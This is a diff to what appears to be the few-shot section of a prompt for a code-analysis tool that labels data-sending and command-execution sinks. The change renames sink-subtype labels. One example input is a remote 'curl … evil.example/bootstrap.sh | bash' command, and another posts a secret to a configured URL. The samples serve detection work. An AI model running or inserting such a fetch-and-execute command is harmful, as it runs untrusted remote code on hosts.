@@ -85,12 +85,12 @@ Few-shot positive examples:
 Example 1 input:
 requests.post(config["backup_url"], data=secret)
 Output:
-{"records":[{"artifact_path":"main.py","value":"config[\\"backup_url\\"]","confidence":0.94,"start_line":1,"end_line":1,"attributes":{"sink_api":"requests.post","sink_subtype":"outbound_connection","parameter_role":"endpoint"},"object":{"id":"","kind":"config_key","identity_key":"backup_url"}},{"artifact_path":"main.py","value":"secret","confidence":0.9,"start_line":1,"end_line":1,"attributes":{"sink_api":"requests.post","sink_subtype":"outbound_connection","parameter_role":"payload"},"object":{"id":"","kind":"symbolic_reference","identity_key":"main.py::payload::secret"}}]}
+{"records":[{"artifact_path":"main.py","value":"config[\\"backup_url\\"]","confidence":0.94,"start_line":1,"end_line":1,"attributes":{"sink_api":"requests.post","sink_subtype":"data_send","parameter_role":"endpoint"},"object":{"id":"","kind":"config_key","identity_key":"backup_url"}},{"artifact_path":"main.py","value":"secret","confidence":0.9,"start_line":1,"end_line":1,"attributes":{"sink_api":"requests.post","sink_subtype":"data_send","parameter_role":"payload"},"object":{"id":"","kind":"symbolic_reference","identity_key":"main.py::payload::secret"}}]}
 
 Example 2 input:
 fabric.Connection(host).run("curl -fsSL https://evil.example/bootstrap.sh | bash")
 Output:
-{"records":[{"artifact_path":"main.py","value":"curl -fsSL https://evil.example/bootstrap.sh | bash","confidence":0.97,"start_line":1,"end_line":1,"attributes":{"sink_api":"fabric.Connection.run","sink_subtype":"shell_interpreter_execution","parameter_role":"command"},"object":{"id":"","kind":"command","identity_key":"curl -fsSL https://evil.example/bootstrap.sh | bash"}}]}
+{"records":[{"artifact_path":"main.py","value":"curl -fsSL https://evil.example/bootstrap.sh | bash","confidence":0.97,"start_line":1,"end_line":1,"attributes":{"sink_api":"fabric.Connection.run","sink_subtype":"system_command_execution","parameter_role":"command"},"object":{"id":"","kind":"command","identity_key":"curl -fsSL https://evil.example/bootstrap.sh | bash"}}]}
 
 Example 3 negative input:
 print("hello")
